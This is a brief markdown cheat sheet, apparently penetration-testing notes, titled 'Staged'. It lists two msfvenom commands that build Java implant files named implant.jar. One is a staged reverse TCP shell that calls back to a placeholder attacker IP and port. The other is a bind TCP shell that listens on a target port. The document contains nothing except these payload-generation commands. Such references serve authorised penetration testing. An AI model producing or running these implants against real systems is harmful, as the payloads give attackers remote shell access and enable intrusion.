# Staged

## 01 - Reverse Shell

```
$ msfvenom -p java/shell/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o implant.jar
```

## 02 - Bind Shell

```
$ msfvenom -p java/shell/bind_tcp lport=<PORT> [RHOST=<target_IP>] -f raw -o implant.jar
```